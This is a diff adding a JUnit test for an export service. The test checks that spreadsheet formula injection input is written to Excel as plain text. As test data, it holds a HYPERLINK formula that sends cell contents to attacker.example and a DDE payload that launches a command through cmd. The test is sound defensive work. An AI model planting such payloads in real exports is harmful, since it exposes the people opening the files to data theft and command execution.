@@ -189,6 +189,39 @@ class ExportServiceTest {
             }
         }
 
+        /**
+         * OWASP Secure Code Review, data flow from a form to a spreadsheet:
+         * text a user typed that starts like a formula (CSV/formula
+         * injection, here a link that would send data out when clicked)
+         * reaches Excel as text, never as a formula Excel would run.
+         */
+        @Test
+        @Order(1)
+        @DisplayName("text that looks like a formula is exported as text, never as a formula")
+        void formulaLikeTextStaysText() throws IOException {
+            String formula = "=HYPERLINK(\"https://attacker.example/?d=\"&A1,\"Apri\")";
+            ContractDTO base = createContractWithNulls();
+            ContractDTO typed = new ContractDTO(base.id(), base.counterpartyId(),
+                    new com.donatodev.bcm_backend.dto.CounterpartyDTO(uid(1), "+cmd|' /C calc'!A0",
+                            com.donatodev.bcm_backend.entity.CounterpartyType.CUSTOMER,
+                            null, null, null, null, null, null, null, null, null),
+                    formula, base.wbsCode(), "@SUM(1+1)", base.status(), base.startDate(), base.endDate(),
+                    null, null, null, null, null, null);
+
+            byte[] excelData = exportService.exportContractsToExcel(List.of(typed));
+
+            try (ByteArrayInputStream bis = new ByteArrayInputStream(excelData); Workbook workbook = new XSSFWorkbook(bis)) {
+                Row row = workbook.getSheetAt(0).getRow(1);
+                for (int column : new int[] {0, 1, 2}) {
+                    assertThat(row.getCell(column).getCellType()).as("column %d", column)
+                            .isEqualTo(org.apache.poi.ss.usermodel.CellType.STRING);
+                }
+                assertThat(row.getCell(0).getStringCellValue()).isEqualTo(formula);
+                assertThat(row.getCell(1).getStringCellValue()).isEqualTo("+cmd|' /C calc'!A0");
+                assertThat(row.getCell(2).getStringCellValue()).isEqualTo("@SUM(1+1)");
+            }
+        }
+
         @Test
         @Order(2)
         @DisplayName("Should export empty list to Excel successfully")
